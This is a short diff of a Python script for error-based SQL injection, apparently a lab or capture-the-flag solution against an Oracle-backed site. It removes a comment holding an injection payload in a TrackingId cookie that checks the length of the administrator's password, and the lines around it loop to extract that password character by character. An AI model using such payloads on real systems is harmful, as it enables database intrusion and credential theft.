@@ -16,8 +16,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def error_sqli():
     password = ""
     # len(password) = 20
-    # This was verified using the following payload:
-    # TrackingId=GXksWCmzmiODlBfb' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20-- 
     for i in range(1, 21):
         for j in range(32, 126):
             # We are dealing with an Oracle database
